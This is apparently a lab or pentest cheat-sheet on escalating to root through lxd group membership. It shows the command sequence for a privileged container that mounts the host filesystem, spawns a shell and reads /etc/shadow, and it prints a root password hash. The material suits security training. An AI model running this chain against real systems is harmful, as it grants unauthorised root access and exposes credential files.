# Group LXD

## Checking Group Membership

```sh
secaudit@NIX02:~$ id
```

```output title="Output"
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),961(lxd)
```

## Starting

```sh
secaudit@NIX02:~$ lxd init
```

## Local Image Import

```sh
secaudit@NIX02:~$ lxc image import incus.tar.xz alpine-minirootfs-3.21.3-x86_64.tar.gz --alias alpine
```

```output title="Output"
Image imported with fingerprint: c7d3915958fd0b2da530a30cea1e218a5eaa1769c4b95b5df37182e14c881c38
```

## Starting Privileged Container

```sh
secaudit@NIX02:~$ lxc init alpine root --config security.privileged=true
```

```output title="Output"
Creating root
```

## Configuration

```sh
secaudit@NIX02:~$ lxc config device add root new-host disk source=/ path=/mnt recursive=true
```

```output title="Output"
Device new-host added to root
```

## Starting Container

```sh
secaudit@NIX02:~$ lxc start root
```

## Shell Spawn

```sh
secaudit@NIX02:~$ lxc exec root /bin/sh
```

## Abusing

```sh
root@root:~# grep root /mnt/etc/shadow
```

```linuxconfig title="Output"
root:$6$WanLJSRD$y.zGt2OxMWkO9K/aNaLzh48ugtuVFjMJp9AT8Q3CxEJNjGaGTarLU5Vs1aZIOGv.jyehUWE5Ue.rz/kYnxDQ2.:19744:0:99999:7:::
```
